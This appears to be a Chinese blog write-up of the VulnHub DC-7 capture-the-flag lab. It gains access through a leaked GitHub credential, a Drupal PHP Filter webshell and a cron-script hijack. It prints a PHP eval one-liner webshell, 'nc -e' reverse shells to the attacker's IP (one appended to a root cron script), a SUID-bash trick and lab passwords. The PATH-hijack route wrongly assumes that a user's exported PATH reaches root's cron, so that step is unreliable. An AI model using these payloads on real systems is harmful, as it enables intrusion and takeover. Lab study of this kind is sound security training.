---
cover: /images/VulnHub.jpg
title: VulnHub DC-7 靶机渗透测试笔记
categories:
  - vulnhub-DC
tags:
  - 靶机渗透
  - VulnHub
  - vulnhub-DC
  - 提权 Drupal
  - 提权
abbrlink: 9bfd2b6a
date: 2026-03-16 12:00:00# VulnHub DC-7 靶机渗透测试笔记

> **靶机系列**：DC Series | **难度**：中等 | **核心漏洞**：GitHub OSINT 信息泄露 + Drupal PHP Filter RCE + PATH 劫持提权

---

## 📋 目录

- [环境信息](#-环境信息)
- [信息收集](#-信息收集)
- [漏洞利用](#-漏洞利用)
- [权限提升](#-权限提升)
- [总结](#-总结)

---

## 🖥️ 环境信息

| 项目 | 信息 |
|------|------|
| 靶机地址 | 192.168.168.170 |
| 攻击机地址 | 192.168.168.128（Kali Linux） |
| 目标 CMS | Drupal 8 |
| 提权方式 | PATH 劫持 / Drupal RCE + cron |

---

## 🔍 信息收集

### 1. 主机发现

使用 nmap 进行主机存活探测：

```bash
nmap -sn 192.168.168.0/24
```

![nmap主机发现](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-7_image1.png)

### 2. 端口与服务扫描

对目标主机进行全端口详细扫描：

```bash
nmap -A -p- 192.168.168.170
```

![端口扫描结果](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-7_image2.png)

### 3. CMS 识别

cms是

![CMS识别](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-7_image3.png)

> 💡 **知识点**：识别 CMS 类型是渗透测试的关键一步，常用方法包括查看页面源码、响应头的 `X-Generator` 字段、特定路径（如 `/wp-login.php`、`/user/login`）等。Drupal 的典型特征是 `/user/login` 登录页和 `CHANGELOG.txt` 文件。

### 4. 目录枚举

```bash
dirsearch -u http://192.168.168.170/ --exclude-status=404,403
```

不显示404、403状态码，过滤无效结果。

![目录枚举结果](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-7_image4.png)

### 5. Drupal 版本探测

```bash
droopescan scan drupal -u http://192.168.168.170（版本问题没装成功）
```

找了一下，有点提示。

![droopescan结果](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-7_image5.png)

> 💡 **知识点**：`droopescan` 是专门针对 Drupal、WordPress 等 CMS 的扫描工具，可以识别插件版本、主题、用户名等信息。但此处版本信息对直接利用帮助有限。

---

## 🔑 漏洞利用

### 6. GitHub OSINT — 关键突破口

直接去 GitHub 上找，只有这一个：

🔗 [https://github.com/Dc7User/staffdb](https://github.com/Dc7User/staffdb)

![GitHub搜索](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-7_image6.png)

找对了！

![仓库内容](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-7_image7.png)

**配置文件泄露信息**：

```php
$servername = "localhost";
$username = "dc7user";
$password = "MdR3xOgB7#dW";
$dbname = "Staff";
```

之前爬目录看到登录界面：

![登录界面](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-7_image8.png)

但是密码不对（数据库凭据不能直接用于 Web 登录）。

> 💡 **知识点**：这是 **GitHub OSINT**（开源情报）的典型场景。开发者将含有数据库凭据的配置文件上传到公开仓库，造成敏感信息泄露。真实渗透中，通过 GitHub 搜索 `org:目标公司 password`、`filename:.env`、`filename:config.php` 等关键词，往往能找到高价值凭据。

---

## 🚪 立足点获取（SSH 登录）

尝试将泄露的凭据直接用于 SSH：

```bash
ssh dc7user@192.168.168.170
# 密码：MdR3xOgB7#dW
```

**登录成功！**

![SSH登录成功](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-7_image9.png)

---

## 🔺 权限提升

### 7. 基本信息枚举

**查找 SUID 文件：**

```bash
find / -perm -u=s 2>/dev/null
```

![SUID查找](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-7_image10.png)

**查看 sudo 权限：**

```bash
sudo -l
```

![sudo权限](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-7_image11.png)

该用户无权限。

---

**查看用户目录：**

目录下有两个文件：

![目录文件](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-7_image12.png)

全是邮件：

![邮件内容](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-7_image13.png)

> 💡 **关键线索**：邮件中发现 root 通过 cron 定时执行脚本。

---

### 8. 分析 Cron 任务

```
Subject: Cron <root@dc-7> /opt/scripts/backups.sh
```

**root 定时执行 `/opt/scripts/backups.sh`**

查看脚本权限：

![文件权限](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-7_image14.png)

| 权限 | 用户 |
|------|------|
| rwx  | root |
| rwx  | www-data |
| r-x  | others |

> ⚠️ **注意**：`www-data` 组对该脚本有写权限（rwx），这是提权的关键！

查看脚本内容：

![脚本内容](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-7_image15.png)

```bash
#!/bin/bash
rm /home/dc7user/backups/*
cd /var/www/html/
drush sql-dump --result-file=/home/dc7user/backups/website.sql
cd ..
tar -czf /home/dc7user/backups/website.tar.gz html/
gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sql
gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gz
chown dc7user:dc7user /home/dc7user/backups/*
rm /home/dc7user/backups/website.sql
rm /home/dc7user/backups/website.tar.gz
```

---

### 📌 路线一：PATH 劫持提权

`drush` 没有写完整路径，存在 PATH 劫持漏洞。

**步骤如下：**

**① 创建恶意 drush：**

```bash
cd /tmp
nano drush
```

写入：

```bash
#!/bin/bash
chmod +s /bin/bash
```

![创建恶意drush](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-7_image16.png)

**② 赋予执行权限：**

```bash
chmod 777 drush
```

**③ 劫持 PATH：**

```bash
export PATH=/tmp:$PATH
```

现在 PATH 顺序变成：

```
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

所以系统会先找 `/tmp/drush`，执行我们的恶意脚本。

**④ 等待 root cron 执行**

有 SUID 权限后：

```bash
find / -perm -u=s 2>/dev/null
```

执行 `/bin/bash -p` 即可获得 root shell。

> 💡 **知识点**：**PATH 劫持**是 Linux 提权的经典手法。当高权限进程（如 root cron）调用的命令不使用绝对路径时，攻击者可以在 PATH 靠前位置放置同名恶意文件来劫持执行流。防御方式是在脚本中使用命令的完整绝对路径（如 `/usr/local/bin/drush`）。

---

### 📌 路线二：Drupal 后台 RCE

还有一种方式，可以读取 Drupal 配置文件获取数据库凭据：

```bash
cat /var/www/html/sites/default/settings.php
```

```php
$databases['default']['default'] = array (
  'database' => 'd7db',
  'username' => 'db7user',
  'password' => 'yNv3Po00',
  'prefix' => '',
  'host' => 'localhost',
  'port' => '',
  'namespace' => 'Drupal\\Core\\Database\\Driver\\mysql',
  'driver' => 'mysql',
);
```

- 📦 数据库名：`d7db`
- 👤 用户名：`db7user`
- 🔑 密码：`yNv3Po00`

**利用 drush 修改 admin 密码：**

```bash
/usr/local/bin/drush user-password admin --password="password123" --root=/var/www/html
```

![修改admin密码](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-7_image17.png)

**登录后台：**

![Drupal后台](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-7_image18.png)

**可以看看数据库（虽然没用）：**

```bash
mysql -u db7user -p'yNv3Po00' -D d7db
SHOW DATABASES;
USE d7db;
SHOW TABLES;
DESC users_field_data;
SELECT uid, name, mail, pass FROM users_field_data;
```

![数据库查询](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-7_image19.png)

试过了，哈希在网上解不出来。



返回看 Web 后台：

![Web后台](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-7_image20.png)

随便乱插，都被 HTML 实体编码了。

```bash
drush status
```

查看了下版本：

![drush status](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-7_image21.png)

没有找到对应版本的利用脚本：

![漏洞脚本查找](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-7_image22.png)

**最后找到利用 PHP Filter 模块！**

但 Drupal 8 默认不启用 PHP 代码解析功能：

![PHP Filter说明](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-7_image23.png)

手动安装 PHP Filter 模块：

```
https://ftp.drupal.org/files/projects/php-8.x-1.0.tar.gz
```

![安装PHP模块](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-7_image24.png)

添加成功，点击启用。

**`Content → Add content → Basic page`**

![新建页面](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-7_image25.png)

要把代码改成 PHP 解析模式：

![设置PHP解析](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-7_image26.png)

可以正常执行，然后写木马连接：

![RCE测试](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-7_image27.png)

**写一句话木马：**

```php
<?php
eval($_POST["pass"]);
```

我用的是哥斯拉的 Webshell 进行连接管理。

> 💡 **知识点**：**PHP Filter 模块**允许在 Drupal 页面内容中直接执行 PHP 代码，是 Drupal 中非常危险的功能。Drupal 8+ 默认移除了该功能，需要手动安装并启用。一旦获得后台权限并能安装模块，即可实现任意代码执行（RCE）。

---

## 🎯 反弹 Shell & 最终提权

**通过 nc 反弹 Shell 到 Kali：**

```bash
# 木马中执行
nc -e /bin/sh 192.168.168.128 5566
```

```bash
# Kali 监听
nc -lvnp 5566
```

反弹到 Kali！

![反弹Shell成功](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-7_image28.png)

**升级为交互式终端：**

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

换个终端，操作更方便。

**写入计划任务反弹 root shell：**

当前是 `www-data` 用户，对 `/opt/scripts/backups.sh` 有写权限，追加反弹命令：

```bash
echo "nc 192.168.168.128 6655 -e /bin/bash" >> /opt/scripts/backups.sh
```

也是写计划任务弹 shell，然后 Kali 监听就好：

```bash
nc -lvnp 6655
```

等 root cron 执行后，即可获得 **root shell** 🎉

---

## 📝 总结

### 完整攻击链

```
信息收集（nmap/dirsearch/droopescan）
    ↓
GitHub OSINT → 配置文件泄露 SSH 凭据
    ↓
SSH 登录（dc7user）
    ↓
发现 root cron 执行 backups.sh（www-data 可写）
    ↓
┌─────────────────────┬──────────────────────────────┐
│  路线一：PATH 劫持   │  路线二：Drupal RCE           │
│  /tmp 恶意 drush    │  settings.php → drush 改密   │
│  → SUID /bin/bash   │  → PHP Filter 模块 → 木马    │
│                     │  → www-data Shell            │
└─────────────────────┴──────────────────────────────┘
    ↓（两条路线最终都写入 backups.sh）
root cron 触发 → root Shell ✅
```

### 🧠 核心知识点回顾

| 技术点 | 说明 |
|--------|------|
| 🔎 GitHub OSINT | 公开仓库中的配置文件、密钥、凭据泄露 |
| 🛤️ PATH 劫持 | 高权限进程调用无绝对路径命令时可被劫持 |
| 🐚 Drupal PHP Filter | 后台模块安装 → PHP 代码执行 → RCE |
| 📅 Cron 利用 | www-data 可写 root cron 脚本 → 权限提升 |
| 🔧 drush | Drupal 命令行管理工具，可直接修改用户密码 |

---

> 本文仅用于学习交流，请勿用于非法用途。
